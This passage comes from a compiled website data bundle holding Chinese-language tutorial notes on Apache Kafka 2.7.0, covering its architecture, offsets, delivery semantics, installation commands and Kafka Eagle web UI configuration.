<id>artifactory</id>\n</profile>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n',charsets:{cjk:!0}},{title:"kafka-2.7.0 基本概念",frontmatter:{title:"kafka-2.7.0 基本概念",date:"2023-06-25T09:22:36.000Z",permalink:"/kafka/1400",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/01.kafka/1400.kafka-2.7.0%20%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html",relativePath:"02.中间件/01.kafka/1400.kafka-2.7.0 基本概念.md",key:"v-3d328794",path:"/kafka/1400/",headers:[{level:2,title:"概念",slug:"概念",normalizedTitle:"概念",charIndex:2},{level:2,title:"kafka 副本分区",slug:"kafka-副本分区",normalizedTitle:"kafka 副本分区",charIndex:1308},{level:2,title:"kafka生产",slug:"kafka生产",normalizedTitle:"kafka 生产",charIndex:1525},{level:3,title:"kafka Leader 选举",slug:"kafka-leader-选举",normalizedTitle:"kafka leader 选举",charIndex:1974},{level:2,title:"kafka 消费模式",slug:"kafka-消费模式",normalizedTitle:"kafka 消费模式",charIndex:2507},{level:3,title:"offset机制",slug:"offset机制",normalizedTitle:"offset 机制",charIndex:3297},{level:2,title:"kafka 索引机制",slug:"kafka-索引机制",normalizedTitle:"kafka 索引机制",charIndex:4128},{level:2,title:"kafka的消息系统语义",slug:"kafka的消息系统语义",normalizedTitle:"kafka 的消息系统语义",charIndex:4636},{level:3,title:"至少一次语义（at least once semantics）all 或 -1",slug:"至少一次语义-at-least-once-semantics-all-或-1",normalizedTitle:"至少一次语义（at least once semantics）all 或 -1",charIndex:4790},{level:4,title:"生产",slug:"生产",normalizedTitle:"生产",charIndex:1531},{level:4,title:"消费",slug:"消费",normalizedTitle:"消费",charIndex:550},{level:3,title:"至多一次语义（at most once semantics）0",slug:"至多一次语义-at-most-once-semantics-0",normalizedTitle:"至多一次语义（at most once semantics）0",charIndex:5204},{level:4,title:"生产",slug:"生产-2",normalizedTitle:"生产",charIndex:1531},{level:4,title:"消费",slug:"消费-2",normalizedTitle:"消费",charIndex:550},{level:3,title:"精确一次语义（Exactly once semantics）",slug:"精确一次语义-exactly-once-semantics",normalizedTitle:"精确一次语义（exactly once semantics）",charIndex:5436},{level:4,title:"生产",slug:"生产-3",normalizedTitle:"生产",charIndex:1531},{level:4,title:"消费",slug:"消费-3",normalizedTitle:"消费",charIndex:550}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"概念 kafka 副本分区 kafka生产 kafka Leader 选举 kafka 消费模式 offset机制 kafka 索引机制 kafka的消息系统语义 至少一次语义（at least once semantics）all 或 -1 生产 消费 至多一次语义（at most once semantics）0 生产 消费 精确一次语义（Exactly once semantics） 生产 消费",content:"# 概念\n\n 1. Kafka 并没有完全遵照 JMS 范，它另辟蹊径，探索出了一条独有的道路\n 2. kafka 是把消息写到页缓存中，然后由操作系统自行决定什么时候把页缓存中的数据写回磁盘上，这样的设计有 3 个主要优势：\n\n * 操作系统页缓存是在内存中分配的，所以消息写入的速度非常快。\n * Kafka 不必直接与底层的文件系统打交道。所有烦琐的 1/0 操作都交由操作系统来处理\n * Kafka 写入操作采用追加写入（ append ）的方式，避免了磁盘随机写操作，且不允许修改己写入的消息，因此它属于典型的磁盘顺序访问型操作。普通的磁盘顺序写入 跟 内存随机写入有过之而无不及。\n\n 3. Kafka 就是依靠下列 4 点达到了高吞吐量、低延时的设计目标的。\n\n * 大量使用操作系统页缓存，内存操作速度快且命中率高。\n * Kafka 不直接参与物理 1/0 操作，而是交由最擅长此事的操作系统来完成。\n * 采用追加写入方式，摒弃了缓慢的磁盘随机读／写操作。\n * 使用以 sendfile 为代表的零拷贝技术加强网络间的数据传输效率。严格来说是通过 Java 的 FileChannel.transferTo 方法实现的。\n\n 4. Kafka 中的 topic 通常都会被多个消费者订阅，因此出于性能的考量， Kafka 并不是 topicmessage 的两级结构，而是采用了 topic-partition-message 的三级结构来分散负载。\n 5. topic partition 下的每条消息都被分配一个位移值。实际上 Kafka 消费者端也有位移（ offset ）的概念，但注意这两个 offset 属于不同的概念。每条消息在某个 partition 位移是固定的，但消费该 partition 的消费者的位移会随着消费进度 (前提要提交 offset) 不断前移。\n 6. 对于每条待发迭的消息，如果该消息指定了 key ，那么该 partitioner 会根据 key 的哈希值来选择目标分区：若这条消息没有指定 key ，则 partitioner 使用轮询的方式确认目标分区一一这样可以最大限度地确保消息在所有分区上的均匀性\n 7. 消费者的 offset 没有提交的话，下次启动会从没提交的地方开始读\n 8. kafka 的广播模式，一个 topic 可以被多个组的一个消费者进行消费，这样就实现了广播模式。也就是组与组之间共享数据，但组内的消费者竞争消费。\n 9. kafka 消费过的数据依旧会保留在文件，可以通过两种方式删除旧数据。两种方式都可以通过修改 vim KAFKA_HOME/config/server.properties 的配置文件来设置。\n\n * 可以基于时间配置，让 kafka 删除一周前的数据。\n\n# 单位小时\nlog.retention.hours=168\n\n\n1\n2\n\n * 也可以在 Partition 文件超过 1GB 时删除旧数据\n\n# 单位字节\nlog.segment.bytes=1073741824\n\n\n1\n2\n\n\n\n# kafka 副本分区\n\n\n\nkafka 的分区，在集群模式下，会均匀分布到每个集群节点。\n\nkafka 的副本指的是分区的副本。副本数量不能超过 集群节点 的数量\n\nkafka 集群是没有 leader 一说的，但对于 分区副本 是有 leader 的。既然有 leader 那么肯定有选举机制，kafka 会在集群中的随机一个 broker (节点) 开启一个 controller 进程，用来进行 leader 的选举。\n\n\n# kafka 生产\n\n\n\n 1. producer 先从 zookeeper 的 */brokers/.../state 节点找到该 partition 的 Leader\n 2. producer 将消息发送给 Leader\n 3. leader 将消息写到本地 log\n 4. follower 从 leader 批量拉取消息，写入本地 log，成功向 leader 发送 ACK\n 5. leader 收到所有 replica 的 ACK 后，增加 HW (high watemark，最后 commit 的 offset) 并向 producer 发送 ACK。\n    期间有 ISR 机制，ISR 是指：比如有三个分布①②③，其中②是 leader，①③是 follower。假设在数据同步过程中，①跟上 leader，但是③出现故障没有同步，则①②是一个 ISR，而③不是 ISR 成员。后期在 Leader 选举时，会用到 ISR 机制，优先从 ISR 中选择 Leader。\n\n\n# kafka Leader 选举\n\n这里所谓的 HA 指得就是对 partition 的 HA，只有 partition 有 Leader 和 follower 机制，所以 Leader 挂了之后要重新选举 Leader。在选举新 Leader 时，一个基本原则是，新的 Leader 必须拥有旧的 Leader commit 过的所有消息。\n\n由写入流程可知 ISR 里面的所有 replication 都跟上了 Leader，只有 ISR 里面的成员才能选为 Leader。对于 f+1 个 replication，一个 partition 可以容忍 f 个 replication 失效的情况下保证消息不丢失。比如一个分区 5 个副本，挂了 4 个，还有一个，依然可以工作。\n\n当所有 replication 都不工作时，有两种可行的方案：kafka0.8* 以后默认使用第二种\n\n 1. 等待 ISR 中的任一个 replication 活过来，并选它做为 Leader。可保障数据不丢失，但时间可能相对较长。\n 2. 选择第一个活过来的 replication（不一定是 ISR 成员）作为 Leader。无法保障数据不丢失，但相对不可用时间较短。\n\n\n# kafka 消费模式\n\n首先明确一点，kafka 使用的是 pull（拉取） 模式。\n\nKafka 最初考虑的问题是，customer 应该从 brokes 拉取消息还是 brokers 将消息推送到 consumer，也就是 pull 还 push。在这方面，Kafka 遵循了一种大部分消息系统共同的传统的设计：producer 将消息推送到 broker，consumer 从 broker 拉取消息。\n\n一些消息系统比如 Scribe 和 Apache Flume 采用了 push 模式，将消息推送到下游的 consumer。这样做有好处也有坏处：由 broker 决定消息推送的速率，对于不同消费速率的 consumer 就不太好处理了。消息系统都致力于让 consumer 以最大的速率最快速的消费消息，但不幸的是，push 模式下，当 broker 推送的速率远大于 consumer 消费的速率时，consumer 恐怕就要崩溃了。最终 Kafka 还是选取了传统的 pull 模式。Pull 模式的另外一个好处是 consumer 可以自主决定是否批量的从 broker 拉取数据。Push 模式必须在不知道下游 consumer 消费能力和消费策略的情况下决定是立即推送每条消息还是缓存之后批量推送。如果为了避免 consumer 崩溃而采用较低的推送速率，将可能导致一次只推送较少的消息而造成浪费。Pull 模式下，consumer 就可以根据自己的消费能力去决定这些策略。Pull 有个缺点是，如果 broker 没有可供消费的消息，将导致 consumer 不断在循环中轮询，直到新消息到达。为了避免这点，Kafka 有个参数可以让 consumer 阻塞知道新消息到达 (当然也可以阻塞知道消息的数量达到某个特定的量这样就可以批量发送消息。\n\n\n# offset 机制\n\nConsumer 在从 kafka 读取消息后，可以选择 commit，该操作会在 kafka 中保存该 Consumer 在该 partition 中读取的消息的 offset。该 Consumer 下一次再读该 partition 时会从下一条开始读取。通过这一特性可以保证同一消费者从 kafka 中不会重复消费数据。\n\nkafka 再启动以后会在配置文件中 log.dirs 设置的路径下生成 50 个 offset 文件，如果是集群启动会，会均分这 50 个 offst 文件。\n\nKafka 对于 offset 的处理有两种提交方式：(1) 自动提交 (默认的提交方式) (2) 手动提交 (可以灵活地控制 offset)\n\n * 自动提交偏移量:\n   Kafka 中偏移量的自动提交是由参数 enable_auto_commit 和 auto_commit_interval_ms 控制的，当 enable_auto_commit=true 时，Kafka 在消费的过程中会以频率为 auto_commit_interval_ms 向 Kafka 自带的 topic (__consumer_offsets) 进行偏移量提交，具体提交到哪个 Partation 是以算法：Math.abs(groupId.hasCode())%50 来计算的。group_id 的获取方式可以通过如下命令查看\n\n./kafka-consumer-groups.sh --bootstrap-server ip:port --list --topic_name\n\n\n1\n\n\n最后调用 consumer.close () 时候也会触发自动提交，因为它默认 autocommit=True\n\n * 手动提交偏移量\n   对于手动提交 offset 主要有 3 种方式：1. 同步提交 2. 异步提交 3. 异步 + 同步 组合的方式提交\n\n\n# kafka 索引机制\n\nkafka 解决查询效率的手段之一是将数据文件分段，可以配置每个数据文件的最大值，每一个 log 文件的大小默认是 1GB。每段放在一个单独的数据文件里面，数据文件以该字段中最小的 offset 命名，其他位置用 0 填充。最初始的文件是 00000000000000000000.log 命名的，但下一个 log 文件生成时的第一条消息的 offset 是 18987，则该 log 文件的命名是 00000000000000018987.log，并且每生成一个 log 文件就会对应产生一个 index 文件，是和 log 文件的命名相同的。这样在进行消息检索的时候可以快速利用二分的方法进行查找，定位到某一个分段文件中。\n\n\n\n稀疏索引 + 二分查找，可以加快查找速度\nindex 文件中并没有为数据文件中的每条 message 建立索引，而是采用了稀疏存储的方式，每隔一定字节的数据建立一条索引。这样避免了索引文件占用过多的空间，从而可以将索引文件保留在内存中。从而需要做一次顺序扫描，但是这场戏顺序扫描的范围就很小了。\n\n索引文件被映射到内存中，所以查找的速度还是很快的。\n\n\n# kafka 的消息系统语义\n\n在一个分布式发布订阅系统中，组成系统的计算机总会由于各自的故障而不能工作。在 kafka 中，一个单独的 broker，可能会在生产者发送消息到一个 topic 的时候宕机，或者出现网络故障，从而导致生产者发送消息失败。根据生产者如何处理这样的失败，产生了不同的语义。\n\n\n# 至少一次语义（at least once semantics）all 或 -1\n\n# 生产\n\n如果生产者收到了 Kafka broker 的确认（acknowledgement，ack），并且生产者的 acks 配置项设置为 all（或 - 1），这就意味着消息已经被精确一次写入 Kafka topic 了。然而，如果生产者接收 ack 超时或者收到了错误，它就会认为消息没有写入 Kafka topic 而尝试重新发送消息。如果 broker 恰好在消息已经成功写入 Kafka topic 后，发送 ack 前，出了故障，生产者的重试机制就会导致这条消息被写入 Kafka 两次，从而导致同样的消息会被消费者消费不止一次。kafka 默认是该语义\n\n# 消费\n\n关闭自动提交，该为手动提交，但是在程序处理的过程中，已经报数据存储数据库中，但在提交 offset 的时候报错，下次会继续消费这条数据，导致数据重复。\n\n\n# 至多一次语义（at most once semantics）0\n\n# 生产\n\n如果生产者在 ack 超时或者返回错误的时候不重试发送消息，那么消息有可能最终并没有写入 Kafka topic 中，因此也就不会被消费者消费到。但是为了避免重复处理的可能性，我们接受有些消息可能被遗漏处理。\n\n# 消费\n\n自动提交机机制会引发这个问题，当消费者拿到数据后，就会立马提交 offset 偏移量，但是数据并没有处理，如果发生处理失败，则下次接收的则是下一个数据。\n\n\n# 精确一次语义（Exactly once semantics）\n\n# 生产\n\n在基于 至少一次语义（at least once semantics）上改进，生产者生成消息的时候，分配一个全局递增的 ID。broker 接收消息的时候，判断当前消息的 ID 是否和已存储的最新的消息 ID 相差 > 1，如果 <= 1，则说明此消费已处理过。如果> 1，证明中间还有数据未到达。\n\n#代码中要设置\nacks=all\n# 必须设置enable.idempotence=true 才有效精确一次\nenable.idempotence=true\n\n\n1\n2\n3\n4\n\n\n# 消费\n\n精确一次必须配置 生产者的精确一次配置，并加如如下\n\nprocessing.guarantee=exact_once\n\n\n1\n\n\n这样在消费者端，通过消息的 ID 实现精确消费。",normalizedContent:"# 概念\n\n 1. kafka 并没有完全遵照 jms 范，它另辟蹊径，探索出了一条独有的道路\n 2. kafka 是把消息写到页缓存中，然后由操作系统自行决定什么时候把页缓存中的数据写回磁盘上，这样的设计有 3 个主要优势：\n\n * 操作系统页缓存是在内存中分配的，所以消息写入的速度非常快。\n * kafka 不必直接与底层的文件系统打交道。所有烦琐的 1/0 操作都交由操作系统来处理\n * kafka 写入操作采用追加写入（ append ）的方式，避免了磁盘随机写操作，且不允许修改己写入的消息，因此它属于典型的磁盘顺序访问型操作。普通的磁盘顺序写入 跟 内存随机写入有过之而无不及。\n\n 3. kafka 就是依靠下列 4 点达到了高吞吐量、低延时的设计目标的。\n\n * 大量使用操作系统页缓存，内存操作速度快且命中率高。\n * kafka 不直接参与物理 1/0 操作，而是交由最擅长此事的操作系统来完成。\n * 采用追加写入方式，摒弃了缓慢的磁盘随机读／写操作。\n * 使用以 sendfile 为代表的零拷贝技术加强网络间的数据传输效率。严格来说是通过 java 的 filechannel.transferto 方法实现的。\n\n 4. kafka 中的 topic 通常都会被多个消费者订阅，因此出于性能的考量， kafka 并不是 topicmessage 的两级结构，而是采用了 topic-partition-message 的三级结构来分散负载。\n 5. topic partition 下的每条消息都被分配一个位移值。实际上 kafka 消费者端也有位移（ offset ）的概念，但注意这两个 offset 属于不同的概念。每条消息在某个 partition 位移是固定的，但消费该 partition 的消费者的位移会随着消费进度 (前提要提交 offset) 不断前移。\n 6. 对于每条待发迭的消息，如果该消息指定了 key ，那么该 partitioner 会根据 key 的哈希值来选择目标分区：若这条消息没有指定 key ，则 partitioner 使用轮询的方式确认目标分区一一这样可以最大限度地确保消息在所有分区上的均匀性\n 7. 消费者的 offset 没有提交的话，下次启动会从没提交的地方开始读\n 8. kafka 的广播模式，一个 topic 可以被多个组的一个消费者进行消费，这样就实现了广播模式。也就是组与组之间共享数据，但组内的消费者竞争消费。\n 9. kafka 消费过的数据依旧会保留在文件，可以通过两种方式删除旧数据。两种方式都可以通过修改 vim kafka_home/config/server.properties 的配置文件来设置。\n\n * 可以基于时间配置，让 kafka 删除一周前的数据。\n\n# 单位小时\nlog.retention.hours=168\n\n\n1\n2\n\n * 也可以在 partition 文件超过 1gb 时删除旧数据\n\n# 单位字节\nlog.segment.bytes=1073741824\n\n\n1\n2\n\n\n\n# kafka 副本分区\n\n\n\nkafka 的分区，在集群模式下，会均匀分布到每个集群节点。\n\nkafka 的副本指的是分区的副本。副本数量不能超过 集群节点 的数量\n\nkafka 集群是没有 leader 一说的，但对于 分区副本 是有 leader 的。既然有 leader 那么肯定有选举机制，kafka 会在集群中的随机一个 broker (节点) 开启一个 controller 进程，用来进行 leader 的选举。\n\n\n# kafka 生产\n\n\n\n 1. producer 先从 zookeeper 的 */brokers/.../state 节点找到该 partition 的 leader\n 2. producer 将消息发送给 leader\n 3. leader 将消息写到本地 log\n 4. follower 从 leader 批量拉取消息，写入本地 log，成功向 leader 发送 ack\n 5. leader 收到所有 replica 的 ack 后，增加 hw (high watemark，最后 commit 的 offset) 并向 producer 发送 ack。\n    期间有 isr 机制，isr 是指：比如有三个分布①②③，其中②是 leader，①③是 follower。假设在数据同步过程中，①跟上 leader，但是③出现故障没有同步，则①②是一个 isr，而③不是 isr 成员。后期在 leader 选举时，会用到 isr 机制，优先从 isr 中选择 leader。\n\n\n# kafka leader 选举\n\n这里所谓的 ha 指得就是对 partition 的 ha，只有 partition 有 leader 和 follower 机制，所以 leader 挂了之后要重新选举 leader。在选举新 leader 时，一个基本原则是，新的 leader 必须拥有旧的 leader commit 过的所有消息。\n\n由写入流程可知 isr 里面的所有 replication 都跟上了 leader，只有 isr 里面的成员才能选为 leader。对于 f+1 个 replication，一个 partition 可以容忍 f 个 replication 失效的情况下保证消息不丢失。比如一个分区 5 个副本，挂了 4 个，还有一个，依然可以工作。\n\n当所有 replication 都不工作时，有两种可行的方案：kafka0.8* 以后默认使用第二种\n\n 1. 等待 isr 中的任一个 replication 活过来，并选它做为 leader。可保障数据不丢失，但时间可能相对较长。\n 2. 选择第一个活过来的 replication（不一定是 isr 成员）作为 leader。无法保障数据不丢失，但相对不可用时间较短。\n\n\n# kafka 消费模式\n\n首先明确一点，kafka 使用的是 pull（拉取） 模式。\n\nkafka 最初考虑的问题是，customer 应该从 brokes 拉取消息还是 brokers 将消息推送到 consumer，也就是 pull 还 push。在这方面，kafka 遵循了一种大部分消息系统共同的传统的设计：producer 将消息推送到 broker，consumer 从 broker 拉取消息。\n\n一些消息系统比如 scribe 和 apache flume 采用了 push 模式，将消息推送到下游的 consumer。这样做有好处也有坏处：由 broker 决定消息推送的速率，对于不同消费速率的 consumer 就不太好处理了。消息系统都致力于让 consumer 以最大的速率最快速的消费消息，但不幸的是，push 模式下，当 broker 推送的速率远大于 consumer 消费的速率时，consumer 恐怕就要崩溃了。最终 kafka 还是选取了传统的 pull 模式。pull 模式的另外一个好处是 consumer 可以自主决定是否批量的从 broker 拉取数据。push 模式必须在不知道下游 consumer 消费能力和消费策略的情况下决定是立即推送每条消息还是缓存之后批量推送。如果为了避免 consumer 崩溃而采用较低的推送速率，将可能导致一次只推送较少的消息而造成浪费。pull 模式下，consumer 就可以根据自己的消费能力去决定这些策略。pull 有个缺点是，如果 broker 没有可供消费的消息，将导致 consumer 不断在循环中轮询，直到新消息到达。为了避免这点，kafka 有个参数可以让 consumer 阻塞知道新消息到达 (当然也可以阻塞知道消息的数量达到某个特定的量这样就可以批量发送消息。\n\n\n# offset 机制\n\nconsumer 在从 kafka 读取消息后，可以选择 commit，该操作会在 kafka 中保存该 consumer 在该 partition 中读取的消息的 offset。该 consumer 下一次再读该 partition 时会从下一条开始读取。通过这一特性可以保证同一消费者从 kafka 中不会重复消费数据。\n\nkafka 再启动以后会在配置文件中 log.dirs 设置的路径下生成 50 个 offset 文件，如果是集群启动会，会均分这 50 个 offst 文件。\n\nkafka 对于 offset 的处理有两种提交方式：(1) 自动提交 (默认的提交方式) (2) 手动提交 (可以灵活地控制 offset)\n\n * 自动提交偏移量:\n   kafka 中偏移量的自动提交是由参数 enable_auto_commit 和 auto_commit_interval_ms 控制的，当 enable_auto_commit=true 时，kafka 在消费的过程中会以频率为 auto_commit_interval_ms 向 kafka 自带的 topic (__consumer_offsets) 进行偏移量提交，具体提交到哪个 partation 是以算法：math.abs(groupid.hascode())%50 来计算的。group_id 的获取方式可以通过如下命令查看\n\n./kafka-consumer-groups.sh --bootstrap-server ip:port --list --topic_name\n\n\n1\n\n\n最后调用 consumer.close () 时候也会触发自动提交，因为它默认 autocommit=true\n\n * 手动提交偏移量\n   对于手动提交 offset 主要有 3 种方式：1. 同步提交 2. 异步提交 3. 异步 + 同步 组合的方式提交\n\n\n# kafka 索引机制\n\nkafka 解决查询效率的手段之一是将数据文件分段，可以配置每个数据文件的最大值，每一个 log 文件的大小默认是 1gb。每段放在一个单独的数据文件里面，数据文件以该字段中最小的 offset 命名，其他位置用 0 填充。最初始的文件是 00000000000000000000.log 命名的，但下一个 log 文件生成时的第一条消息的 offset 是 18987，则该 log 文件的命名是 00000000000000018987.log，并且每生成一个 log 文件就会对应产生一个 index 文件，是和 log 文件的命名相同的。这样在进行消息检索的时候可以快速利用二分的方法进行查找，定位到某一个分段文件中。\n\n\n\n稀疏索引 + 二分查找，可以加快查找速度\nindex 文件中并没有为数据文件中的每条 message 建立索引，而是采用了稀疏存储的方式，每隔一定字节的数据建立一条索引。这样避免了索引文件占用过多的空间，从而可以将索引文件保留在内存中。从而需要做一次顺序扫描，但是这场戏顺序扫描的范围就很小了。\n\n索引文件被映射到内存中，所以查找的速度还是很快的。\n\n\n# kafka 的消息系统语义\n\n在一个分布式发布订阅系统中，组成系统的计算机总会由于各自的故障而不能工作。在 kafka 中，一个单独的 broker，可能会在生产者发送消息到一个 topic 的时候宕机，或者出现网络故障，从而导致生产者发送消息失败。根据生产者如何处理这样的失败，产生了不同的语义。\n\n\n# 至少一次语义（at least once semantics）all 或 -1\n\n# 生产\n\n如果生产者收到了 kafka broker 的确认（acknowledgement，ack），并且生产者的 acks 配置项设置为 all（或 - 1），这就意味着消息已经被精确一次写入 kafka topic 了。然而，如果生产者接收 ack 超时或者收到了错误，它就会认为消息没有写入 kafka topic 而尝试重新发送消息。如果 broker 恰好在消息已经成功写入 kafka topic 后，发送 ack 前，出了故障，生产者的重试机制就会导致这条消息被写入 kafka 两次，从而导致同样的消息会被消费者消费不止一次。kafka 默认是该语义\n\n# 消费\n\n关闭自动提交，该为手动提交，但是在程序处理的过程中，已经报数据存储数据库中，但在提交 offset 的时候报错，下次会继续消费这条数据，导致数据重复。\n\n\n# 至多一次语义（at most once semantics）0\n\n# 生产\n\n如果生产者在 ack 超时或者返回错误的时候不重试发送消息，那么消息有可能最终并没有写入 kafka topic 中，因此也就不会被消费者消费到。但是为了避免重复处理的可能性，我们接受有些消息可能被遗漏处理。\n\n# 消费\n\n自动提交机机制会引发这个问题，当消费者拿到数据后，就会立马提交 offset 偏移量，但是数据并没有处理，如果发生处理失败，则下次接收的则是下一个数据。\n\n\n# 精确一次语义（exactly once semantics）\n\n# 生产\n\n在基于 至少一次语义（at least once semantics）上改进，生产者生成消息的时候，分配一个全局递增的 id。broker 接收消息的时候，判断当前消息的 id 是否和已存储的最新的消息 id 相差 > 1，如果 <= 1，则说明此消费已处理过。如果> 1，证明中间还有数据未到达。\n\n#代码中要设置\nacks=all\n# 必须设置enable.idempotence=true 才有效精确一次\nenable.idempotence=true\n\n\n1\n2\n3\n4\n\n\n# 消费\n\n精确一次必须配置 生产者的精确一次配置，并加如如下\n\nprocessing.guarantee=exact_once\n\n\n1\n\n\n这样在消费者端，通过消息的 id 实现精确消费。",charsets:{cjk:!0}},{title:"Kafka-2.7.0 搭建及参数解析",frontmatter:{title:"Kafka-2.7.0 搭建及参数解析",date:"2023-06-25T09:22:36.000Z",permalink:"/kafka/1401",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/01.kafka/1401.Kafka-2.7.0%20%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%8F%82%E6%95%B0%E8%A7%A3%E6%9E%90.html",relativePath:"02.中间件/01.kafka/1401.Kafka-2.7.0 搭建及参数解析.md",key:"v-38452f23",path:"/kafka/1401/",headers:[{level:2,title:"搭建",slug:"搭建",normalizedTitle:"搭建",charIndex:2},{level:3,title:"文件介绍",slug:"文件介绍",normalizedTitle:"文件介绍",charIndex:218},{level:3,title:"基础命令",slug:"基础命令",normalizedTitle:"基础命令",charIndex:562},{level:3,title:"启动",slug:"启动",normalizedTitle:"启动",charIndex:368},{level:2,title:"kafka web UI",slug:"kafka-web-ui",normalizedTitle:"kafka web ui",charIndex:1953},{level:2,title:"参数解析",slug:"参数解析",normalizedTitle:"参数解析",charIndex:4967},{level:2,title:"阿里云中部署注意事项",slug:"阿里云中部署注意事项",normalizedTitle:"阿里云中部署注意事项",charIndex:6041}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"搭建 文件介绍 基础命令 启动 kafka web UI 参数解析 阿里云中部署注意事项",content:"# 搭建\n\nwget https://mirrors.tuna.tsinghua.edu.cn/apache/kafka/2.7.0/kafka_2.13-2.7.0.tgz\n\ntar -xzf kafka_2.13-2.7.0.tgz\ncd kafka_2.13-2.7.0\n\n\n1\n2\n3\n4\n\n\n> 下载的 kafka 自带有 ZooKeeper，但很快，ZooKeeper 将不再被 Apache Kafka 所需要。\n\n\n# 文件介绍\n\nkafka 安装好以后包含有以下文件\n\n[root@localhost kafka_2.13-2.7.0]# ls\nbin  config  libs  LICENSE  NOTICE  site-docs\n\n\n1\n2\n\n * bin 包含 kafka 的 topic 脚本、kafka 启动脚本、ZooKeeper 启动脚本、生产者脚本、消费者脚本等\n * config 包含生产者配置、消费者配置、ZooKeeper 配置、kafka 配置以及一些 connect 配置\n * libs 主要是一些 jar 文件\n\n> 应用程序一般做为生产者和消费者，对于 kafka 服务配置只需要关心 ZooKeeper 和 kafka 本身配置即可，其余在应用本身可以控制\n\n\n# 基础命令\n\n创建 topic，--replication-factor 副本数量 ，--partitions 分区数量，副本数量最好小于集群数量\n\n./kafka-topics.sh --create --zookeeper ip:2181  --replication-factor 1 --partitions 1 --topic topic_name\n\n\n1\n\n\n删除 topic\n\n./kafka-topics.sh --delete --zookeeper ip:2181 --topic topic_name\n\n\n1\n\n\n查看所有的 topic\n\n./kafka-topics.sh --list --zookeeper ip:2181 \n\n\n1\n\n\n查看某一个 topic 的详情\n\n./kafka-topics.sh --zookeeper ip:2181 --describe --topic topic_name\n\n\n1\n\n\n启动 producer\n\n./kafka-console-producer.sh --broker-list ip:9092  --topic topic_name\n\n\n1\n\n\n启动 consumer，--from-beginning 从头开始消费，没有之前生产的数据会丢弃\n\n./kafka-console-consumer.sh --bootstrap-server ip:9092  --topic topic_name --from-beginning\n\n\n1\n\n\n\n# 启动\n\n启动 zookeeper\n\n# 先修改配置\nvim /config/zookeeper.properties\n\nzookeeper.connect=192.168.81.62:2181\nclientPortAddress=192.168.81.62\n# 启动\nbin/zookeeper-server-start.sh -daemon config/zookeeper.properties\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n配置 kafka，并启动，如果是集群模式的话，只需要改 broker.id 即可\n\n# 先修改配置\nvim /config/server.properties\n\n# 集群模式下broker.id 必须唯一\nbroker.id=0\n# 消息的存储位置(持久化位置)\nlog.dirs=/tmp/kafka-logs\n# 配置kafka允许被连接的ip和端口\nlisteners=PLAINTEXT://192.168.81.62:9092\n# zookeeper连接 多台zookeeper ',' 逗号分割\nzookeeper.connect=192.168.81.62:2181\n# 启动\nbin/kafka-server-start.sh -daemon config/server.properties\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n成功启动所有服务后，您将运行并可以使用基本的 Kafka 环境。\n\n> 先关闭 kafka 再关闭 zookeeper，若先关闭了 zookeeper 导致 kafka 无法关闭，可以再启动 zookeeper 后关闭 kafka。\n\n\n# kafka web UI\n\n官方文档，我下载到了 window 本机，并没有在 linux 上操作，首先该 UI 要求有 java8 的环境配置中，然后把下载解压的文件也配置到环境变量中，否则会启动报错，而且变量必须叫 KE_HOME。\n\n\n\n然后修改 D:\\tools\\kafka-eagle-web-2.0.4\\conf\\system-config.properties，复制以下配置到你的文件中就好了，很多的配置使用不到的，只需要修改 数据库连接 和 cluster1.zk.list 地址就好\n\n######################################\n# multi zookeeper & kafka cluster list\n######################################\nkafka.eagle.zk.cluster.alias=cluster1\ncluster1.zk.list=192.168.81.62:2181\n\n######################################\n# zookeeper enable acl\n######################################\ncluster1.zk.acl.enable=false\n\n######################################\n# broker size online list\n######################################\ncluster1.kafka.eagle.broker.size=20\n\n######################################\n# zk client thread limit\n######################################\nkafka.zk.limit.size=32\n\n######################################\n# kafka eagle webui port\n######################################\nkafka.eagle.webui.port=8048\n\n######################################\n# kafka jmx acl and ssl authenticate\n######################################\ncluster1.kafka.eagle.jmx.acl=false\n\n######################################\n# kafka offset storage\n######################################\ncluster1.kafka.eagle.offset.storage=kafka\n#cluster2.kafka.eagle.offset.storage=zk\n\n######################################\n# kafka jmx uri\n######################################\n#cluster1.kafka.eagle.jmx.uri=service:jmx:rmi:///jndi/rmi://%s/jmxrmi\n\n######################################\n# kafka metrics, 15 days by default\n######################################\nkafka.eagle.metrics.charts=true\nkafka.eagle.metrics.retain=15\n\n######################################\n# kafka sql topic records max\n######################################\nkafka.eagle.sql.topic.records.max=5000\n\n######################################\n# delete kafka topic token\n######################################\nkafka.eagle.topic.token=keadmin\n\n######################################\n# kafka mysql jdbc driver address\n######################################\nkafka.eagle.driver=com.mysql.cj.jdbc.Driver\nkafka.eagle.url=jdbc:mysql://192.168.81.61:3306/ke?useUnicode=true&characterEncoding=UTF-8&zeroDateTimeBehavior=convertToNull\nkafka.eagle.username=root\nkafka.eagle.password=Admin@123\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n启动 D:\\tools\\kafka-eagle-web-2.0.4\\bin\\ke.bat\n\n看到 tomcat 打印，需要多等待一些时间，如果等待太久可以先关闭 kafka 服务。\n\n2021-02-20 16:44:06 INFO  [ZooKeeper.Thread-236] - Initiating client connection, connectString=192.168.81.62:2181 sessionTimeout=30000 watcher=kafka.zookeeper.ZooKeeperClient$ZooKeeperClientWatcher$@7bac5016\n2021-02-20 16:44:06 INFO  [ZooKeeperClient.Thread-236] - [ZooKeeperClient] Waiting until connected.\n\n\n1\n2\n\n\n\n\n> 常见的 web 